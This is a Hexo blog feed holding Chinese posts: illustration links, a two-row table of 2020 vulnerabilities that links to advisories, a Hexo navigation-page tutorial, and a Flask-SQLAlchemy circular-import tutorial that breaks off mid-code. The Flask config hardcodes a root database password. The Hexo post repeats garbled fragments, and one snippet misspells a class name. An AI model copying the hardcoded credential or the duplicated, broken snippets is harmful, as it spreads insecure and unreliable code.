    <entry>
      <title>插画推荐v0001</title>
      <link href="/posts/36607.html"/>
      <url>/posts/36607.html</url>
      
        <content type="html"><![CDATA[<h2 id="个人向插画推荐"><a href="#个人向插画推荐" class="headerlink" title="个人向插画推荐"></a>个人向插画推荐</h2><blockquote><p>昵称:惠子<br>UID: 19896569<br>如果喜欢,可以下载打包好的图:<code>https://wws.lanzous.com/iOd4igsvi4h</code></p></blockquote><p><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi1qkyixj20m80doq55.jpg" alt="006BFMdqly1giv2sdb6brj30m80dotay.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2bh84yj21zy25se81.jpg" alt="006BFMdqly1gitzfwzkbmj31zy25se7z.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi23nekvj22jo35oe81.jpg" alt="006BFMdqly1gitzfwzbq5j32jo35o7wh.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi1ye0eej21rw3347tj.jpg" alt="006BFMdqly1gitzfw590pj31rw334qv5.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi76pracj21xn2qdx6u.jpg" alt="006BFMdqly1gitzera7fyj31xn2qdb2g.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi6rhy6jj21uo2qdu10.jpg" alt="006BFMdqly1gitzeoc057j31uo2qd1l1.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi6mp3ryj21zz208u11.jpg" alt="006BFMdqly1gitzencgtnj31zz208b2c.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi4u268zj21rw2qd7wj.jpg" alt="006BFMdqly1gitzemo9byj31rw2qd4qs.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi4j5y2cj228d2p8npf.jpg" alt="006BFMdqly1gitzelbo6jj328d2p8u0y.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi4ogvlsj228d35o7wj.jpg" alt="006BFMdqly1gitzeimcqsj328d35ou0y.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi6zgwz3j228d35ohdw.jpg" alt="006BFMdqly1gitzei0s6sj328d35ox6r.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi46m72hj21xn2qdkjm.jpg" alt="006BFMdqly1gitzeho3z3j31xn2qdkjn.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi4dcdeyj21ww2rib2b.jpg" alt="006BFMdqly1gitzehdstgj31ww2ri4qr.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi4uxsluj21xn2qdqv6.jpg" alt="006BFMdqly1gitzegn2wqj31xn2qdnpe.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi4uf4krj22bc2qdhdu.jpg" alt="006BFMdqly1gitzegbbe1j32bc2qde82.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi5hg837j224j2jve83.jpg" alt="006BFMdqly1gitzefiphvj324j2jv4qr.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2kp1j5j21xn2qdhdt.jpg" alt="006BFMdqly1gitzed1e34j31xn2qdkjl.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2cw5coj21291kn1kl.jpg" alt="006BFMdqly1gitzebcwecj31291knqub.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi23c579j21xn2bce81.jpg" alt="006BFMdqly1gitzeb0rrxj31xn2bce81.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi5b33a3j228d35o7wi.jpg" alt="006BFMdqly1gitzeaqf4yj328d35ox6p.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2ju1sqj21wm1ytu0x.jpg" alt="006BFMdqly1gitzeap6zyj31wm1ytx6p.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2irqqxj21dd1wwu0x.jpg" alt="006BFMdqly1gitzeak56uj31dd1wwqv5.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2juimfj21e0104qq3.jpg" alt="006BFMdqly1gitzeab37pj31e0104qs0.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi30t0rsj21jk26khdt.jpg" alt="006BFMdqly1gitzea5cwyj31jk26knpd.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2sf264j21kw14nqnq.jpg" alt="006BFMdqly1gitze91gz3j31kw14n7s7.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi625xm6j22g135okjn.jpg" alt="006BFMdqly1gitzdaqbzmj32g135okjm.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi69kwmgj228d28dhdu.jpg" alt="006BFMdqly1gitzdag3mvj328d28de82.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi6zesnyj228d2z67wk.jpg" alt="006BFMdqly1gitzda4tl2j328d2z6kjm.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2lba3aj215o15o0z8.jpg" alt="006BFMdqly1gitzd87rnlj315o15own7.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi36ob4lj21le2g1x6p.jpg" alt="006BFMdqly1gitzd9axedj31le2g1hdt.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2l52ycj215o1fsteb.jpg" alt="006BFMdqly1gitzd8i3agj315o1fs465.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2o0vv0j21jk1v110g.jpg" alt="006BFMdqly1gitzd8cj0cj31jk1v1dqy.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2oi0l4j21jk1zf7bu.jpg" alt="006BFMdqly1gitzd8bicrj31jk1zfn7u.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2nevk4j215o1mxafd.jpg" alt="006BFMdqly1gitzd8ancqj315o1mxjyk.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2ops8uj20rs0yttd2.jpg" alt="006BFMdqly1gitzd7zx4jj30rs0ytq8o.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2ts65aj21jk26k12v.jpg" alt="006BFMdqly1gitzd7yk7lj31jk26ktmi.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2sb2bkj21e01e0akk.jpg" alt="006BFMdqly1gitzd7y2e5j31e01e0gzr.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2rn80fj215o1mf7bt.jpg" alt="006BFMdqly1gitzd7nn0yj315o1mf48c.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2ykybzj21jk1fhqcz.jpg" alt="006BFMdqly1gitzd7ik4jj31jk1fhnag.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi32vy60j21jk25s7la.jpg" alt="006BFMdqly1gitzd7h9b0j31jk25skdm.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2x4ex5j21e01ypagy.jpg" alt="006BFMdqly1gitzd7ekw8j31e01ypqcv.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi2yv3n5j215o1n4dmx.jpg" alt="006BFMdqly1gitzd7aw5yj315o1n4wns.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi32o45bj215o1mun89.jpg" alt="006BFMdqly1gitzd6vhasj315o1munbd.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi30p1nmj20m80cin0w.jpg" alt="006BFMdqly1giszic1h7uj30m80ci0wj.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi30e4cjj20m80dyju9.jpg" alt="006BFMdqly1ghu8iq8njgj30m80dyacz.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi32wmxdj20m80cugq7.jpg" alt="006BFMdqly1gh58irrjynj30m80cun1t.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi32o5srj20m80cd0yk.jpg" alt="006BFMdqly1gh56qhkx00j30m80cdn31.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi330tiwj20m80d1tby.jpg" alt="006BFMdqly1gh45wbmjd4j30m80d1juv.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi37u78wj20m80cytfh.jpg" alt="006BFMdqly1gh38aifob0j30m80cy45a.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi3athkrj20xc0mw19r.jpg" alt="006BFMdqly1gh28vi44pvj30xc0mwtpp.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi35cvlxj20m80codjf.jpg" alt="006BFMdqly1gh5f8v1ky0j30m80coadu.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi34mdyyj20m80edn0c.jpg" alt="006BFMdqly1gh4ig91um8j30m80ed0w1.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi35e9zij20e409g77b.jpg" alt="006BFMdqly1gh4adnv3izj30e409g41t.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi35r3waj20m80dwq5m.jpg" alt="006BFMdqly1gh3ckx6c96j30m80dwtbp.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi390lsaj20m80el45v.jpg" alt="006BFMdqly1gh3b422fhsj30m80el45v.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi37kkq7j20m80cvn0l.jpg" alt="006BFMdqly1gh2z4nn609j30m80cvn0p.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi37merhj20m80dr42j.jpg" alt="006BFMdqly1gh2z4ncmx5j30m80drdk4.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi3bj0tmj211y0lcdqb.jpg" alt="006BFMdqly1gh1okmj6b4j311y0lcth8.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi3b7nm5j20xc0lltg2.jpg" alt="006AYjs4ly1gc7r32xz44j30xc0lldn1.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi3boqsrj20rs0i70zr.jpg" alt="006AVDn4ly1ge5ys4bu4ej30rs0i7tfp.jpg"><br><img src="https://tva1.sinaimg.cn/large/a20ab060ly1gixi3abu1dj20rs0ghaea.jpg" alt="006AVDn4ly1gdlm3jzw7gj30rs0ghn1b.jpg"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 插画 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pivix </tag>
            
            <tag> 插画 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020年9月漏洞</title>
      <link href="/posts/14597.html"/>
      <url>/posts/14597.html</url>
      
        <content type="html"><![CDATA[<table><thead><tr><th>时间</th><th>漏洞信息</th><th>解决方案</th></tr></thead><tbody><tr><td><code>2020-9</code></td><td><code>IE</code>远程代码执行漏洞</td><td><a href="https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1092" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2020-1092</a></td></tr><tr><td><code>2020-9</code></td><td><code>fastjson</code>反序列漏洞</td><td><a href="https://github.com/alibaba/fastjson" target="_blank" rel="noopener">https://github.com/alibaba/fastjson</a></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 系统漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo添加导航书签</title>
      <link href="/posts/57516.html"/>
      <url>/posts/57516.html</url>
      
        <content type="html"><![CDATA[<h2 id="添加书签导航"><a href="#添加书签导航" class="headerlink" title="添加书签导航"></a>添加书签导航</h2><h3 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h3><blockquote><p>虽然浏览器中能保存各种各样的书签,但是同步是一个问题,展现又是另外一个问题,所以顺便在<code>hexo</code>中创建一个类书签导航.</p><p>访问:<a href="https://wenyan.online/navigate/" target="_blank" rel="noopener">https://wenyan.online/navigate/</a> 查看效果</p></blockquote><h3 id="1-创建资源文件夹"><a href="#1-创建资源文件夹" class="headerlink" title="1.创建资源文件夹"></a>1.创建资源文件夹</h3><blockquote><p>按照<a href="https://hexo.io/zh-cn/docs/asset-folders" target="_blank" rel="noopener">官网</a>的说明,<code>source</code>文件存放了除去文章之外所有的资源(<code>css\js\images</code>),所以我们的文件要创建在这里.</p><p>新建一个 <code>navigate</code>目录</p><pre class="line-numbers language-bash"><code class="language-bash">❯ <span class="token function">mkdir</span> source/navigate/❯ <span class="token function">cd</span> source/navigate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>创建好之后,可以直接放入开源的<a href="https://github.com/WebStackPage/WebStackPage.github.io" target="_blank" rel="noopener">webstack</a>,也可以根据它创建自己想要的<code>html</code>页面.</p><p>这里我修改过一些文件,加入一个多重搜索引擎的快捷方式,如果你要使用,可以参考<a href="https://github.com/ningwenyan/demo_code#javascript%E6%8E%A7%E5%88%B6%E5%8F%AF%E5%88%87%E6%8D%A2%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%90%9C%E7%B4%A2%E6%A1%86" target="_blank" rel="noopener">我的github示例代码</a></p></blockquote><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2.修改配置文件"></a>2.修改配置文件</h3><blockquote><ul><li><p>修改根目录下的<code>_config.yml</code>.因为<code>hexo</code>编译会对主题模板进行渲染之后生成静态页面,但是这个导航的网站本身就是 <code>html</code>文件,因此不需要渲染,那么跳过渲染就需要配置 <code>skip_render</code> 项.</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">skip_render</span><span class="token punctuation">:</span> <span class="token punctuation">-</span> <span class="token string">'navigate/**'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>修改主题下的配置文件<code>_config.yml</code>.添加一级菜单如下:</p><pre class="line-numbers language-yaml"><code class="language-yaml"><span class="token key atrule">Friends</span><span class="token punctuation">:</span><span class="token key atrule">url</span><span class="token punctuation">:</span> /friends<span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>address<span class="token punctuation">-</span>book<span class="token key atrule">Navigate</span><span class="token punctuation">:</span><span class="token key atrule">url</span><span class="token punctuation">:</span> /navigate<span class="token key atrule">icon</span><span class="token punctuation">:</span> fas fa<span class="token punctuation">-</span>rocket <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>修改语言页面<code>languages/zh-CN.yml</code>:</p><pre class="line-numbers language-yaml">Navigate: WenYan导航</code></pre></li><li><p>修改<code>ejs</code>渲染文件(<code>layout/_partial_navigation.ejs</code>).</p><pre><code class="ejs">menuMap.set(&quot;Navigate&quot;, &quot;WenYan导航&quot;)</code></pre></li></ul></blockquote><h3 id="3-压缩css-js以及cdn加速"><a href="#3-压缩css-js以及cdn加速" class="headerlink" title="3.压缩css/js以及cdn加速"></a>3.压缩<code>css/js</code>以及<code>cdn</code>加速</h3><blockquote><p>如果你使用的是<code>vs code</code>,建议安装<code>js css minifier</code>,然后使用快捷键<code>F1</code>,压缩<code>css/js</code>文件.</p><p>然后就是<code>html</code>文档中所有使用到的<code>js/css/images</code>,建议全部使用<code>jsdelivr</code>加速访问.</p></blockquote><h3 id="4-编译文件"><a href="#4-编译文件" class="headerlink" title="4.编译文件"></a>4.编译文件</h3><blockquote><pre><code class="bash"><code class="language-yaml">Navigate: WenYan导航</code></pre></li><li><p>修改<code>ejs</code>渲染文件(<code>layout/_partial_navigation.ejs</code>).</p><pre><code class="ejs">menuMap.set(&quot;Navigate&quot;, &quot;WenYan导航&quot;)</code></pre></li></ul></blockquote><h3 id="3-压缩css-js以及cdn加速"><a href="#3-压缩css-js以及cdn加速" class="headerlink" title="3.压缩css/js以及cdn加速"></a>3.压缩<code>css/js</code>以及<code>cdn</code>加速</h3><blockquote><p>如果你使用的是<code>vs code</code>,建议安装<code>js css minifier</code>,然后使用快捷键<code>F1</code>,压缩<code>css/js</code>文件.</p><p>然后就是<code>html</code>文档中所有使用到的<code>js/css/images</code>,建议全部使用<code>jsdelivr</code>加速访问.</p></blockquote><h3 id="4-编译文件"><a href="#4-编译文件" class="headerlink" title="4.编译文件"></a>4.编译文件</h3><blockquote><pre><code class="bash">$ hexo g$ hexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h3 id="5-效果展示"><a href="#5-效果展示" class="headerlink" title="5.效果展示"></a>5.效果展示</h3><blockquote><p><img src="https://tva1.sinaimg.cn/large/a20ab060gy1gip7idxvdsj21ee0onacl.jpg" alt="10292.png"></p></blockquote><h3 id="6-添加网页"><a href="#6-添加网页" class="headerlink" title="6.添加网页"></a>6.添加网页</h3><blockquote><p>由于定位类书签的缘故,它收录的地址并不是完全的,是需要去实时更新添加的.但是它的结构非常简单,这里简单的说下</p><ul><li><p>侧边栏,主要更新 <code>main-menu</code></p><pre class="line-numbers language-html">&lt;ul id=&quot;main-menu&quot; class=&quot;main-menu&quot;&gt;</code></pre></li><li><p>展示栏,主要更新<code>row</code>中的内容.</p><pre><code class="html"><code class="language-html">&lt;ul id=&quot;main-menu&quot; class=&quot;main-menu&quot;&gt;</code></pre></li><li><p>展示栏,主要更新<code>row</code>中的内容.</p><pre><code class="html"><h4 class="text-gray"><i class="linecons-tag" style="margin-right: 7px;" id="常用推荐"></i>常用推荐</h4><div class="row"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/wechat.png" alt="wechat"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Flask-SQLAlchemy循环引用</title>
      <link href="/posts/28185.html"/>
      <url>/posts/28185.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-9/1599666568728-10290.png" alt="10290"></p><h2 id="解决Flask-SQLAlchemy循环引用"><a href="#解决Flask-SQLAlchemy循环引用" class="headerlink" title="解决Flask-SQLAlchemy循环引用"></a>解决Flask-SQLAlchemy循环引用</h2><h3 id="1-问题"><a href="#1-问题" class="headerlink" title="1.问题"></a>1.问题</h3><blockquote><p>新建一个<code>flask</code>项目,它的初始化项目为:</p><pre class="line-numbers language-bash"><code class="language-bash">$ treecircular_references├── app.py                    <span class="token comment" spellcheck="true"># 主 app 文件</span>├── static                        <span class="token comment" spellcheck="true">#  css,js 文件目录</span>└── templates              <span class="token comment" spellcheck="true"># 模板文件目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了项目的健壮性,可以把<code>flask</code>的配置文件写入一个文件中<code>config.py</code></p><p>此时实现一个如下的文件结构</p><pre class="line-numbers language-bash"><code class="language-bash">$ treecircular_references├── app.py                          <span class="token comment" spellcheck="true"># 主 app 文件</span>├── config.py                        <span class="token comment" spellcheck="true"># Flask 配置文件</span>├── static                              <span class="token comment" spellcheck="true">#  css,js 文件目录</span>└── templates                     <span class="token comment" spellcheck="true"># 模板文件目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>config.py</code></p><pre class="line-numbers language-python"><code class="language-python">DEBUG <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment" spellcheck="true"># 开启Debug</span>TEMPLATES_AUTO_RELOAD <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token comment" spellcheck="true"># 模板自动加载</span>DB_URI <span class="token operator">=</span> <span class="token string">'mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/flask_alembic_demo'</span> <span class="token comment" spellcheck="true"># 确保数据库存在</span><span class="token comment" spellcheck="true"># 指定数据库连接</span>SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> DB_URISQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>app.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> config<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemyapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">.</span>from_object<span class="token punctuation">(</span>config<span class="token punctuation">)</span>db <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User2</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'user2'</span>    id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    name <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 创建数据库关系, 双向联系</span>    addresses <span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'Address2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Address2</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>    __tablename__ <span class="token operator">=</span> <span class="token string">'address2'</span>    id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    email_address <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    u_id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> db<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span><span class="token string">'user2.id'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 创建数据库关系, 双向联系</span>    user <span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'User2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'addresses'</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello World!'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>随着项目的不断壮大,不可能把所有的<code>SQLAlchemy Model</code> 都写入到<code>app.py</code> 主<code>app</code> 文件中,这时候就需要独立出一个文件专门存放<code>Model</code> 类<code>models.py</code></p><pre class="line-numbers language-bash"><code class="language-bash">circular_references├── app.py                          <span class="token comment" spellcheck="true"># 主 app 文件</span>├── config.py                        <span class="token comment" spellcheck="true"># Flask 配置文件</span>├── models.py                    <span class="token comment" spellcheck="true"># 存放flask-sqlalchemy.Model 类</span>├── static                              <span class="token comment" spellcheck="true">#  css,js 文件目录</span>└── templates                     <span class="token comment" spellcheck="true"># 模板文件目录</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这时候需要修改<code>app.py</code>和新建<code>models.py</code>文件.</p><p><code>models.py</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># models.py</span><span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemydb <span class="token operator">=</span> SQlAlchemy<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">User2</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>       __tablename__ <span class="token operator">=</span> <span class="token string">'user2'</span>       id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>       name <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 创建数据库关系, 双向联系</span>       addresses <span class="token operator">=</span> db<span class="token punctuation">.</span>relationship<span class="token punctuation">(</span><span class="token string">'Address2'</span><span class="token punctuation">,</span> back_populates<span class="token operator">=</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Address2</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>       __tablename__ <span class="token operator">=</span> <span class="token string">'address2'</span>       id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>       email_address <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>       u_id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> db<span class="token punctuation">.</span>ForeignKey<span class="token punctuation">(</span><span class="token string">'user2.id'</span><span class="token punctuation">)</span><span class="token 